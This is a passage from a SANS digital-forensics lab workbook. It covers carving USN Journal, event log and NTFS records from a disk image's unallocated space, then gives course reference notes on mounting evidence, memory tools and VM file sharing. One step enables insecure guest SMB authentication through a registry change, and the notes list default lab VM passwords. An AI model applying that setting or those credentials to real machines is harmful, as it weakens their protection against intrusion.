this trivial. Simply run it against the image ﬁle and direct the output to a new ﬁle. The new ﬁle will be a concatenation of all
the unallocated clusters extracted from the volume. Open a command prompt and run the following.

Attention
Note that command takes a few minutes to complete, and the resulting ﬁle will be about 33 GB, so make sure you have
plenty of space on your host machine.

.

blkls D:\SRL-Data\Disk-Images\rd01-c-drive.E01 > G:\Labs\ntfs-anti-forensics\rd01-cdrive-unalloc.raw

2. Next, make a directory for the Bulk Extractor with Record Carving output at G:\Labs\ntfs-anti-forensics\bulk-extractorrec

mkdir G:\Labs\ntfs-anti-forensics\bulk-extractor-rec

3. Now start Bulk Extractor Viewer from the "Artifact Tools" fence on the Desktop. Then choose Tools > Run bulk_extractor...

© 2023 SANS Institute

.

271

4. Choose an Image File of G:\Labs\ntfs-anti-forensics\rd01-cdrive-unalloc.raw and Output Feature Directory of G:
\Labs\ntfs-anti-forensics\bulk-extractor-rec . Then disable all scanners along the right except for the following:
• evtx
• ntfsindx
• ntfslogfile
• ntfsmft

.

• ntfsusn

5. Choose Submit Run from the bottom of the dialog box. You may have to resize the dialog box to see the bottom buttons. You
should then see a progress dialog box like the following. This process typically takes 3-5 minutes to complete. You can close
the dialog box once it ﬁnishes.

272

© 2023 SANS Institute

.

6. Have a look at the output data in G:\Labs\ntfs-anti-forensics\bulk-extractor-rec . We will look at each of these artifacts
individually.
USN Journal Carved Records

Let's work on parsing the recovered USN Journal records. We'll use a tool from Joakim Schicht named UsnJrnl2Csv. Like many of
his tools, it includes features to handle inconsistences with carved records.
1. Open a command prompt and change directories to the ntfsusn_carved directory and have a look at the available ﬁles:

.

cd /d G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfsusn_carved
dir

You should see just one ﬁle, UsnJrnl-J , which is 59 MB in size.
2. Run the UsnJrnl2Csv against the collection of USN records in UsnJrnl-J . Note that we use the /ScanMode:1 option here for
a more thorough (and longer) scan. This will take 10 minutes or so to complete.
UsnJrnl2Csv /UsnJrnlFile:G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfsusn_carved\UsnJrnl-J /
OutputPath:G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfsusn_carved /Separator:, /ScanMode:1

3. The output will be in G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfsusn_carved . The parsed entries are in a CSV
named in the format of UsnJrnl_<timestamp>.csv . Open this ﬁle in Timeline Explorer. When viewing in Timeline Explorer, use
Tools > Reset Column Widths to get a more manageable view.
Questions:
• How many records are available in this new parsed output?
___________________________________________________

© 2023 SANS Institute

.

273

Solution
• There are more than 507,000 records in the output. That's a signiﬁcant number of USN journal records!

• Based on this data set, what is the time span of these events (earliest event to latest)?
___________________________________________________
Solution

.

• The events span from 2022-08-31 17:42:23 through 2023-01-23 04:52:25
• Note that the most recent time for the carved records is about 2 hours prior to the earliest records in the active
USN Journal. If you check the earliest event from G:\Precooked\ntfs-anti-forensics\usnjrnl-rd01.csv , you'll
see that the timestamp was from 2023-01-23 06:51:25.

• Over that time span, how many executables were created? Do any look interesting or suspicious?
___________________________________________________

274

© 2023 SANS Institute

.

Hint

.

Apply a "File Name" column ﬁlter for Ends with .exe and a "Reason" column ﬁlter for Contains FILE_CREATE

© 2023 SANS Institute

.

275

Solution
• 329 executables were created
• Using the ﬁlter provided in the hint, you could build off of that to ﬁlter out some of the noisier and likely benign
process. For example, add -dismhost.exe to the global ﬁlter at the top-right. However, that just removes a few.
Maybe a simpler option and just as quick is to sort by File Name so that they are grouped together, and then scroll
through the list. If you do this, it might be fairly far down the list before any grab your attention. Here are some
that do seem interesting though.
• python.exe and python3.exe , coincidentally created on the day of the earliest attacker activity on RD01. This is
an end-user system. Is it typical for an end-user to install Python? Perhaps. This is Timothy Dungan's system. He's

.

the lead research engineer at SRL, so it's not out of the question, but this probably deserves follow-up nonetheless.

• Ah ha! STUN.exe and SRLUpdate.exe creation times! We didn't get those in the active USN Journal. Also, note the
creation time of STUN.exe : 2023-01-17 15:44:25. That's quite a bit different than it's current creation timestamp
from 2022-06-25!

276

© 2023 SANS Institute

.

At ﬁrst glance, we're getting some great extra visibility! Keep in mind though, we are seeing many USN Journal records over this
time frame, but it's just a sampling of the overall activity that occurred. These are USN records that happened to have been left in
various areas of unallocated, so there's really no rhyme or reason to what we will have available. Nevertheless, this extra visibility
undoubtedly provides insight that we would not have otherwise. With some effort, and the investigative need, it can be well worth
the time spent to carve for records such as the USN Journal.

Note
One more reminder that carving for records in unallocated did not include records found in volume shadow copies. Lab 5.1
covered volume shadow copy analysis. There are various additional techniques to extract data from VSCs, including KAPE
and Velociraptor, as well as parsing artifacts in VSC automatically with Plaso/Log2timeline (covered in Lab 5.2).

Additional Carved Records

For the remaining carved records, we'll leave it to you to parse and analyze them. With regard to parsing tools, below are some
recommendations for the remaining record types.

Attention
Here's an important point about carving and parsing carved data: The data is not pristine! Corruption occurs, and therefore
parsing errors should be expected. It's the nature of dealing with data from unallocated areas of the disk. Most of our parsing
tools will produce output log ﬁles. It's important to review them. However, the fact there will be some errors generated and that
a tool could not fully parse a ﬁle does not mean we should immediately revert to a hex editor or string searches. Getting the

.

majority of carved events into a standard format we're accustomed to reviewing is still very useful.

EVTX:

• EvtxECmd generally handles the carved EVTX ﬁles well. A primary beneﬁt is that it can parse many ﬁles quickly. When you
look at the results of EVTX carving in G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\evtx_carved , you'll see that's
indeed useful! If you get pop-ups about failed parsing, you can click Ignore and it should continue on.
• Event Log Explorer usually works quite well also. The downside is that you're reviewing one ﬁle at a time in the GUI. If you ﬁnd
a carved ﬁle of interest, initially try loading it via File > Open Log File > New API ... This is the best option to use if possible
because it allows the Windows Event Log channel providers to read the logs and provide the true messages that should go
with the events. However, if that fails due to corruption, try File > Open Log File > Direct .. instead. This extracts the data for
viewing without trying to parse them via the Event Log APIs.
MFT:
• Joakim Schicht's Mft2Csv typically works well. Like many of his tools, it includes features to handle inconsistences with
carved records. Here's an screenshot for the setup that works well:

© 2023 SANS Institute

.

277

I30:
• A Python script from Willi Ballenthin named INDXParse.py handles the carved records relatively well. You will see quite a few
timestamp-related errors when it runs, but again, that's the nature of dealing with carved data. Overall, this script is fast and

.

eﬃcient at parsing INDX records. Here's an example command line for running it:
INDXParse.py -c G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfsindx_carved\INDX > G:\Labs\ntfs-antiforensics\bulk-extractor-rec\ntfsindx_carved\INDX-indxparse.csv

LogFile:
• The $LogFile is notoriously diﬃcult to analyze. It also covers a timespan of just a few hours in the active $LogFile.
Nevertheless, there are times it could have just the bit of information you are looking for. Carving for and parsing $LogFile
entries will increase those odds. Once again, probably the best tool for handling these carved records is from Joakim Schicht.
Here's an example command for running his LogFileParser64 tool:
LogFileParser64.exe /LogFileFile:G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfslogfile_carved\LogFileRCRD /SkipSqlite3:1 /OutputPath:G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfslogfile_carved

• Note that this will likely take about 3 hours to complete!
• Other notes about the output:
• Once processing completes, use Windows File Explorer to have a look at the new directory created in
G:\Labs\ntfs-anti-forensics\bulk-extractor-rec\ntfslogfile_carved\ (directory name will be in the format of

278

© 2023 SANS Institute

.

LogFile_YYYY-MM-DD_HH-MM-SS ). There should be quite a few ﬁles inside it. You can get an explanation of each output ﬁle

from the Github repo at https://github.com/jschicht/LogFileParser.
• A lot of data will be output to the console. This data will be available in a ﬁle named debug.log .
• The primary ﬁle with parsed transactions is LogFile.csv .

Lab Takeaways
This lab looked at a number of ways to detect and recover from attackers attempting to hide their tracks. When you have access
to a full disk image, including remotely via a tool such as Velociraptor, it opens many additional forensic possibilities. But those
options have to be balanced with the time invested to pursue them. We have tried to focus on some areas where you will get the
most beneﬁt for the extra time spent.
Finally, you will ﬁnd an extended Anti-Forensics Bonus Lab in the course dropbox. The lab is on a system unrelated to the current

.

SRL intrusion and is perfect for additional practice when you have time!

© 2023 SANS Institute

.

279

Final Challenge Evidence Reference
Objectives
Given the amount of information covered in this course, it's easy to get overwhelmed. It's also easy to lose track of where to ﬁnd
the information you're looking for to perform a particular type of analysis. This document is intended to be a quick reference to
remind you of some of those details.
Our goal is not to rewrite the full data access and analysis steps. Instead, it is to list some of the key techniques we've discussed
throughout the course and provide pointers to the corresponding labs for doing that work. You can then take the new evidence
and follow the same methodology. Ideally this will help you be more eﬃcient with your time during the ﬁnal challenge, as well as
during your future studies of the material.

Attention
It is highly recommended you use this guide in the electronic workbook. We make heavy use of hyperlinks to more eﬃciently
point students to relevant material, so it will be much more functional in the browser-based version.

Accessing Evidence Data
The majority of the evidence acquired from Stark Research Labs is found on your FOR508 ISO "B" and ISO "C" ﬁles. On the ISOs,
you will ﬁnd a combination of triage images, disk images, memory images, and precooked super timelines in CSV format.
There are also important data sets in your course VMs. In particular, the Velociraptor & Kansa hunts are in the 508 Windows VM

.

and the super timelines are pre-ingested into ELK in your 508 SIFT Linux VM.
Accessing ISO contents within the FOR508 VMs
The ISO format is quite ﬂexible, capable of being opened with a double-click on a Windows host. However, for this class you will
most likely want to access the contents inside of your class virtual machines where your tools are present. By this point in the
course you will have likely already accomplished this at least once.
1. Whether your goal is to access the ISO data within the Windows or Linux VMs, the setup process is the same. After locating
your ISO "B" or "C" ﬁle, you will need to attach it to the VM as a DVD drive. The conﬁguration for connecting the ISO to the VM
varies slightly depending on which VMware product is used (Workstation, Player, or Fusion). In all cases, though, it will be
speciﬁed via the guest Virtual Machine's Settings dialog box. Based on the VMware product you are using, you can access a
VM's CD/DVD conﬁguration Settings page as follows:
• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD
• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

280

© 2023 SANS Institute

.

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data inside the
VM.

Example conﬁguring CD/DVD from VMware Workstation

In this case, the ISO ﬁle was located in the folder C:\508-Files and the ISO "B" ﬁle was named 508.23.1B.iso . Of course
you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS student portal.
• Reminder: Be sure to check the box to "Connect" the CD/DVD hardware to the guest.

of how that looks in each VM:

.

2. Now inside the VM, the ISO ﬁle should be auto-mounted within a few seconds and show up as a DVD drive. Here are examples

© 2023 SANS Institute

.

281

Example for the Linux VM
• To verify the ISO is connected, click the DVD button on the Activities bar to the left. It should open the root directory of
the mounted ISO. Here is an example for the root of ISO "B" (note that the ISO volume name will change over time):

• To access the ﬁles from the command-line, open a Terminal windows and change directories to the mounted DVD
drive (ISO image) and then run ls :

.

cd /media/sansforensics/
ls

• You should now see a directory named after the ISO volume name. cd into that folder, as shown in this example here
for the volume named 508.23.1B :
cd <Insert Your Volume Name Here (e.g., 508.23.1B)>

• You are now ready to access the contents within the ISO volume.

282

© 2023 SANS Institute

.

Example for the Windows VM
• To verify the ISO is connected and access the data, click the DVD drive in the Windows VM. Likely it will be the

D:

drive. It should open the root directory of the mounted ISO. Here is an example for root of ISO "B" (note that the ISO
volume name will change over time):

• You can now access the contents of the ISO volume.
Tips on sharing data between VMs and ISOs
• Note that connecting the same ISO ﬁle to both VMs simultaneously should work without an issue.
• Also, recall that there are a number of ways to transfer data between the VMs, such as copying to or from the \
\siftworkstation

SMB share. See the Resources page VM File Transfer Options for several ideas.

Extracting 7zip compressed data from the ISOs
Most of the evidence in the ISOs is compressed with 7zip ultra compression. This allows us to maximize the data you receive

.

while minimizing the download sizes (as best we can). Below are examples for decompressing the 7zip ﬁles in the VMs.

Warning
The default option for unzipping content is often to unzip into the same location as the ﬁle. This will not work for items
present within an ISO image because they are read-only. Thus you will need to make sure to provide an extraction location
outside of the ISO mount point.

© 2023 SANS Institute

.

283

Example for the Linux VM
To extract 7zip ﬁles in Linux, use the 7z command with the x directive to "extract" the contents. Add the -o/path/to/extract
option to specify the output directory to extract the ﬁles. We recommend creating a folder structure in the /cases folder to
stay organized. Note that there should not be a space between

-o and the extraction path. For example:

Sample command
Here's an example process for creating a new directory for the extracted triage image of rd03 and then extracting it to that
location (e.g., /cases/rd03/triage-image ). We use mkdir -p ﬁrst to automatically create any directories necessary to
generate the full path.

hi

de

01

.ir

mkdir -p /cases/rd03/triage-image
7z x rd03-triage.vhdx.7z -o/cases/rd03/triage-image

284

© 2023 SANS Institute

.

Example for the Windows VM
To extract 7zip ﬁles in Windows, locate the 7zipped archive in File Explorer. Then right-click it and choose
files ... Pick a location to extract the data. We recommend creating a folder structure in the

7zip > Extract

G: drive to stay organized. For

.

example:

Mounting VHDX Triage Images in the VMs
On ISO "C", you will ﬁnd a 7zipped VHDX triage image for every available Windows host in Stark Research Labs. Like any real
incident, some will be critical to the investigation, while others will not. We recommend you unzip and access the triage data only
as necessary based on signs of malware and lateral movement discovered during your investigation. See above for unzipping
instructions. You can then mount a VHDX in either Windows or Linux.

© 2023 SANS Institute

.

285

Example for the Windows VM
• In Windows, you can access the contents of the VHDX triage images simply by double-clicking them.
• The Lab Preparation section of Lab 2.1 provided discussion and context for this process.
Example for the Linux VM
• Optional Lab 4.3B: Super Timeline Creation - Linux provided steps for Mounting a VHDX image in the Linux SIFT VM.

Mounting E01 C-Drive Disk Images in the VMs
On ISO "B", you will ﬁnd E01 compressed disk images. We've covered in class and in labs various options for mounting disk
images in both Windows and Linux. Here are some reminders of those techniques.
Mounting E01 C-Drive disk images in Windows
We've discussed two different tools for interacting with E01 compressed images in Windows: Arsenal Image Mounter and FTK
Imager.

.ir

• Arsenal Image Mounter (AIM) is very good at mounting an image such that Windows treats it is a real disk. It can be mounted
read-only, or alternatively with a temporary write-cache ﬁle. Some analysis tools require write access to the evidence, so this is

01

a useful feature that AIM provides to simulate a writeable disk.

de

In Optional Lab 1.3: Creating Disk Images with KAPE, there is a section on acquiring a triage image from a full disk image. This
walkthrough provides is a good reminder for how to mount a disk image in Windows with AIM.

hi

• FTK Imager is not as effective as AIM for disk mounting. However, it can be very helpful for pulling ﬁles of interest, including
deleted ﬁles and ﬁle system data like $I30 directory indexes. In Lab 5.4: Anti-Forensic Analysis and Data Recovery, we included
a section on Recovering Deleted Files with FTK Imager, which may be helpful.
Mounting E01 C-Drive disk images in Linux
We spent quite a bit of time analyzing the C-drive disk image of RD01. We began the deep-dive by mounting the active ﬁle system
and volume shadow copies in Lab 5.1. The Preparation section of that lab will be a good reminder for how to mount Windows
disk images and shadow copies to get low-level access to system ﬁles and data.

286

© 2023 SANS Institute

.

Note
If you still have the RD01 disk image mounted in Linux and you follow the steps in Lab 5.1 Preparation to try to mount another
image, you will get errors because the mount directories are currently in use. The simple ﬁx is to reboot to clear those mount
points so you can mount the new image.
Alternatively, there is a helper script in the Linux VM to create a new directory structure for mounting a new image. The script is
named create_for508_mounts.py . If you run the script (as root), you need to provide a descriptive name representing the disk
image you are analyzing. It then creates a set of directories (by default in the /mnt directory) for performing the various
mounts and operations needed to analyze the active and shadow ﬁle systems. Here is a brief description of the mount

.

directories it creates:

This is designed to be a quick and easy option to create empty directories for forensic mounting. Alternatively, you could
create new directories as needed while setting up the mounts. All that said, if this is overly confusing, the simple ﬁx is to
reboot your Linux VM to clear the mount points of RD01 and then follow the steps in Lab 5.1 with the new disk image.

Analyzing Memory Images in the VMs
Stark Research Labs acquired memory from several systems in the network during their response. You will ﬁnd these memory
images on ISO "C". Similar to the triage images made available to you, not every memory image will be particularly important, so
let your investigation (and curiosity) guide you.
Memory images are 7zipped to save space. Instructions above cover the steps necessary to unzip 7zip archives. In this class, we
presented two primary tools available for memory forensics: Volatility and MemProcFS.

© 2023 SANS Institute

.

287

Windows VM: Analyzing Memory with MemProcFS
• MemProcFS provides exceptionally quick access to memory objects. It is pre-installed in your 508 Windows VM
• The Introducing MemProcFS section of Lab 3.2 will provide a good refresher on getting started with MemProcFS
• MemProcFS can also be leveraged with built-in YARA rules. The section MemProcFS + Yara in Lab 3.3 covers how to
enable this feature. A sample command line follows:
MemProcFS.exe -forensic 1 -device <unzipped memory image> -license-accept-elastic-license-2.0

Linux VM: Analyzing Memory with Volatility
• Volatility is pre-installed in your 508 SIFT LINUX VM
• The Look for Suspicious Processes section of Lab 3.1 is a good starting point when using Volatility
• We covered additional Volatility commands in the section Investigate Process Objects with Volatility in Lab 3.2
• A sample command line:
vol.py -f <unzipped memory image> windows.pstree

Reviewing Autoruns and Kansa Data
The Kansa PowerShell collection tool was run in SRL after the intrusion was identiﬁed. You might recall using some of this output
in Lab 1.2: Malware Persistence Analysis and the optional homework in Lab 1.4: Scaling Incident Response and Threat Hunting.
You can ﬁnd the collected Kansa ﬁles within your 508 Windows VM in the folder

G:\SRL_Evidence\kansa\kansa-post-

.

intrusion\Output_20230129122316\ . The individual Autorunsc ﬁles could be particularly useful to analyze for systems of interest.

288

© 2023 SANS Institute

.

Virtual Machine Credentials
The login credentials for all virtual machines used in this class are listed below for quick reference.
All login credentials are also displayed in the respective virtual machine's information panel. Below are screenshots showing the
login credentials under VMware Workstation and VMware Fusion, respectively.

1. FOR508 SIFT Linux Workstation
• Username: sansforensics
• Password: forensics
This user has sudo access for all commands on the virtual machine.
2. FOR508 Windows VM

• Password: forensics

.

• Username: SANSDFIR

This user has local administrative rights on the virtual machine.

© 2023 SANS Institute

.

289

How to Approach the Labs

The FOR508 SRL Intrusion Lab Workbook is full of crucial information that will assist with course objectives and provide
guidelines and instructions for many investigations in the future.

.

To ensure you get the most out of each lab, we would like to step you through the different sections of the workbook. The
workbook is speciﬁcally designed to enable students from a variety of backgrounds and different skill levels to get the most out of
each lab.

Lab Objectives
This section provides the big picture of what the lab is meant to show or teach. We might be demonstrating an analytical
technique or the speciﬁc output of a forensic tool. We strongly recommend you quickly look over these objectives when beginning
the lab.

Lab Preparation
Labs are designed to stand on their own. This allows students who are reviewing the labs to jump in without necessarily having
completed previous labs. We typically outline the speciﬁc system, the condition of that system, or the capabilities that must be
enabled before moving into the actual lab. Skipping over this step could mean that your system might not be ready for analysis.

290

© 2023 SANS Institute

.

Questions without Explanations and Questions with Step-by-Step Instructions
We want you to focus on the core concepts and analytical techniques of each lab instead of just running blindly through a tool.
Eventually, you will master the tool, but the most important part of this course, especially if you are new, is to focus on the output
of the tool and how to properly analyze it.
There are two parts to every lab:
1. Lab questions without any help or explanations.
2. Solutions with full step-by-step instructions and explanations.
For most students doing the lab for the ﬁrst time, we recommend liberally using the solutions to see the step-by-step instructions
and explanations.

Note
The step-by-step instructions and explanations are provided immediately following each question using a drop-down box
such as this (click the box to see the solution):
Solution
Here is where an answer would be. There will be a drop-down box such as this following most questions.

Think of the labs as being accomplished in three ways. FOR508 is an advanced course, so we recommend beginning or
intermediate students approach labs as follows:
• Gain familiarity: The ﬁrst time through the lab students should liberally use the solutions to see the step-by-step instructions

.

and familiarize themselves with the overall topic and techniques. Remember you are here to learn, not to ﬁght your system or
become confused. You will get more from the lab by following along and mimicking what you see directly while reading the
full (and sometimes lengthy) explanations.
• Gain mastery: When reviewing the lab again, we recommend using the “hybrid” approach. This approach has you start with
the part of the lab that has questions without any help or explanations, but then reference the solutions when you get stuck.
Students should be comfortable doing the labs themselves by the time they reach the ﬁnal capstone exercise, and the
capstone systems will rely on the same procedures and techniques found in the labs to provide more experience.
• Achieve mastery: Once you can complete the lab without referencing the step-by-step information within the solutions, you have
mastered the skill. This is a great way to demonstrate you are ready to pass the certiﬁcation for this course. If you have already
mastered the skills on labs from the start, it is likely you have learned those skills already or know them from previous courses.
It is also likely you already have the skills needed to do Incident Response and Threat Hunting in the real world. Many students
take a class to obtain new skills, but the more advanced you get, the fewer new skills you will learn each time taking a course.
We aim for students to reach this stage after having completed the ﬁnal capstone exercise, reviewing the labs a few more
times, and then testing themselves by completing the full lab without referencing the step-by-step information within the
solutions.

© 2023 SANS Institute

.

291

Takeaways
For every lab, the takeaway section highlights important case-related artifacts we uncovered as a result of our analysis. The
takeaway section is important because these artifacts will build on one another as we progress through the course. Sometimes it
is hard to remember “How did we ﬁnd pa.exe?” in a new lab that suddenly asks you to use prior knowledge to look for something
new. We advise regularly reviewing the takeaways from each lab to refresh your memory of the ongoing incident we will be
investigating.

Precooked Lab Output
For every lab, there is a certain amount of “keyboard kung fu” necessary to complete the course. If you are struggling with the
seemingly never-ending command line input, we have relevant lab output pre-generated for you within precooked folders:
• FOR508 Windows VM: G:\Precooked\<subfolder>
• FOR508 SIFT LINUX VM: /cases/precooked/<subfolder>
Using the right techniques to approach the labs from the start is essential for your success in this course. Everyone in the course
is learning, so there is no reason to feel judged if you are regularly using the solutions during each lab. Take advantage of the

.

structure of the labs to facilitate the maximum learning possible for your particular skill level and background. Enjoy!

292

© 2023 SANS Institute

.

What’s on the FOR508 Course Media?
The listing below describes the hierarchy of ﬁles and folders on the FOR508 course media.

Note
7zip is the primary archive format used because it has a higher compression rate than standard zip. The Windows 7zip
installer is in "ISO-A", as is Keka for Mac. For Linux, use 7z on the command line. Basic extraction usage is:
7z x <filename.7z>

Tip
Each ISO image contains a sans-integrity.yml text ﬁle. This ﬁle contains SHA-256 hashes for each of the ﬁles present on
the media. If you ever experience issues with any of the ﬁles provided, a good ﬁrst check is to compare the SHA-256 hash of
the ﬁle with its corresponding entry in sans-integrity.yml .

ISO-A
• utilities\
• Recommended extraction tools if you do not already have them installed
• virtual_machines\

.

• Includes the two (2) virtual machines used extensively in class.
ISO-B
• SRL-Data\
• Disk-Images\
• Full volume C-drive images for selected systems.
ISO-C
• SRL-Data\
• Memory-Images\
• Selected memory images acquired by SRL in raw memory dump format.
• Supertimelines\
• Super timelines for all (available) SRL Windows hosts, created just as demonstrated in class using a source of the
KAPE triage images. Timelines do not include any volume shadow data. Psort was used to create the CSVs preﬁltered for our relevant time frame. After generating CSVs, extraneous data was removed by grepping out noisy ﬁle
types and event log entries.

© 2023 SANS Institute

.

293

•

Triage-Images\

.

• KAPE triage images for all available SRL Windows hosts in vhdx format.

294

© 2023 SANS Institute

.

VM File Transfer Options
There are a number of ways to move ﬁles among the VMs, host OS, ISO ﬁles, and USB drives. Below we describe several of them.
• VM File Transfer Options
• Connect ISO image ﬁle to VM as a DVD drive
• Copy-paste between host OS and VMs
• VMware "Shared Folders" between host OS and VMs
• Using the SMB share on the Linux VM
• Connect USB drive to VMs

Connect ISO image file to VM as a DVD drive
The ISO ﬁles you downloaded for class can be mounted as read-only CD/DVD drives via VMware guest settings. This is a great
approach for working with the extra evidence data provided as part of the course. The conﬁguration for connecting the ISOs to the
VMs varies slightly based on which VMware product is used (Workstation, Player, or Fusion), but in all cases it will be speciﬁed via
the guest VM's Settings dialog box.

.

Here's an example from VMware Workstation:

In this case, the ISO ﬁle was located on the E: drive on the host (and note that the speciﬁc ISO ﬁle names will change over time).
Of course you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS website.
Importantly, be sure to check the boxes to "Connect" the CD/DVD hardware to the guest. It is not checked by default.

© 2023 SANS Institute

.

295

You can access a VM's CD/DVD conﬁguration settings as follows:
• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD
• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data in the VM.

• Accessing ﬁles inside the Windows VM:
• From inside the Windows VM, the ISO ﬁle should be auto-mounted and show up as a DVD drive, as shown in the example
below. This screenshot is showing the data available in a prior version of ISO "B". The exact ﬁles and folders available in

• Accessing ﬁles inside the Linux VM:

.

your ISO "B" may be different.

• From inside the Linux VM, the ISO ﬁle should be auto-mounted and show up as a DVD drive, as shown below. To access
the data at the command-line, change directories to /media/sansforensics .

296

© 2023 SANS Institute

.

Copy-paste between host OS and VMs
This is perhaps the simplest approach, but it only works between the host and guest VMs. It does not work directly from one guest
VM to another guest VM. With VMware products and VMware Tools installed in the guest virtual machine, it should be possible to
use copy and paste not only for text, but also for ﬁles and directories. It should also work in both directions (i.e. from guest to host
and from host to guest).

.

Unfortunately, this feature sometimes fails. A reboot of the virtual machine usually ﬁxes the problem. However, a reboot can be
pretty inconvenient when you're in the middle of analysis, so using some of the other techniques below may help get around it.
Also be aware that with copy & paste (aka drag & drop), copied ﬁles will sometimes get left in temporary directories on the host
and/or VM, which can lead to wasted space. Therefore, if copying large ﬁles, it may be better to use one of the other approaches.
You can check the temporary VMwareDnD folder occasionally for large orphaned ﬁles. See the article "Clean VMwareDnD Folder"
for details.

VMware "Shared Folders" between host OS and VMs
This is another feature that only works between the host and guest VMs. It does not work directly from one guest VM to another
guest VM.
Each of the VMware products has an option to conﬁgured "Shared Folders". The conﬁguration varies slightly based on which
product is used (Workstation, Player, or Fusion), but in all cases it will be speciﬁed in the guest VM's settings.
Here's an example from VMware Workstation:

© 2023 SANS Institute

.

297

In this case, the C:\Temp drive on the host has been shared with the VM using the Add... wizard to setup the conﬁguration. You
can access a VM's Shared Folders conﬁguration settings as follows:

.

• VMware Workstation: Use the VM menu and choose Settings... > Options tab > Shared Folders
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Options tab > Shared Folders
• VMware Fusion: Choose Virtual Machine > Sharing > Sharing Settings...
From inside a Windows VM, the shared folder can be accessed by browsing in File Explorer to Network > vmware-host > Shared
Folders ( \\vmware-host\Shared Folders ), as shown here:

298

© 2023 SANS Institute

.

From inside a Linux VM, the shared folder is accessible from the /mnt/hgfs directory, as shown here:

Using the SMB share on the Linux VM
The Linux SIFT Workstation has been conﬁgured to share its /cases and /mnt directories via SMB. This makes it very convenient
to share ﬁles between the Linux VM and the FOR508 Windows VM, as well as the student's host machine. The simple way to

.

access it is to browse to \\siftworkstation , as shown here:

However, sometimes this does not work properly. In that case, here are some things to check:
1. Does Windows allow access to anonymous shares?
• Newer versions of Windows do not allow accessing anonymous SMB shares by default. This can be changed easily with
the following PowerShell command. Note that this is a persistent change and it does not require a reboot to take effect.

© 2023 SANS Institute

.

299

Open a PowerShell command prompt as Administrator and run the following command to update the appropriate
registry setting:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters"
AllowInsecureGuestAuth -Type DWORD -Value 1 -Force

• If prompted for a password when connecting to \\siftworkstation , use any username and password combination (for
example, sansforensics & forensics ). The Linux VM is conﬁgured for an anonymous connection, so technically it

.

shouldn't be necessary. However, Windows sometimes forces a credentialed logon anyway.
2. Is Windows able to resolve the siftworkstation hostname?
Name resolution does not always work properly. In that case, you need to ﬁnd the IP address of the Linux VM ﬁrst, and then
access it directly via the IP address ( \\<SIFT-IP-address> ).
For example, here we show using ifconfig to get the IP address of the Linux SIFT's primary network interface, which should
be ens33 :

300

© 2023 SANS Institute

.

.

Then we use the IP address of the Linux SIFT to connect to the share directly:

3. Does the Linux VM have an IP address?
What if you do not see an IP address when using ifconfig ? This happens occasionally with the Linux VM. To ﬁx it, run the
following command to restart the Network Manager service:
sudo systemctl restart NetworkManager

Here's an example showing the ens33 interface without the IPv4 inet address. After restarting NetworkManager and giving
it a few seconds to get an IP via DHCP, we see ifconfig shows ens33 now has an IPv4 inet address (your address will be
different).

© 2023 SANS Institute

.

301

Once the share is working, ﬁle transfer is fairly simple and fast using this method.

Connect USB drive to VMs
When the desire is to connect a physical USB drive inside the VM, it's best to click inside the VM ﬁrst so it has focus and then

.

insert the USB device. VMware should recognize that the VM was active and automatically insert the USB in that VM. If not, it
should prompt you with a question about where to mount the USB. In Windows, it will look similar to this when you are prompted:

302

© 2023 SANS Institute

.

If you are not prompted and it doesn't show up automatically in the VM, then use the menu option to connect a Removeable

.

Device to the VM, as shown here in VMware Workstation:

© 2023 SANS Institute

.

303

How to Update Zimmerman Tools & KAPE
Objectives
Update Eric Zimmerman's Tools and KAPE by running a pair of update scripts.

Tip
Please only update these tools if suggested to do so by your instructor, or at the conclusion of your class. The versions of the
tools pre-installed in the VM have been veriﬁed to work as expected with the labs. Updates to the tools may lead to results
which will not exactly match the workbook lab solutions.

Exercise Preparation
This exercise is completed in your 5 08 Windows
VM.Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics

Updating KAPE

1. Open an administrator PowerShell window

.

This process will update the Kroll Artifact Parser And Extractor (KAPE) tool.

2. Run the following commands:
cd C:\Forensic_Program_Files\kape

.\Get-KAPEUpdate.ps1

For example:

304

© 2023 SANS Institute

.

• In this case, the script veriﬁed we were running the latest version of KAPE.

Updating Zimmerman Tools
This process will update all of the open source tools created by Eric Zimmerman

2. Run the following commands:

.

1. Open a PowerShell Admin window

cd C:\Forensic_Program_Files\ZimmermanTools

.\Get-ZimmermanTools.ps1 -NetVersion 6

For example:

© 2023 SANS Institute

.

305

hi

de

01

.ir

• In this case, the script found 3 Zimmerman Tools to update.

306

© 2023 SANS Institute

.

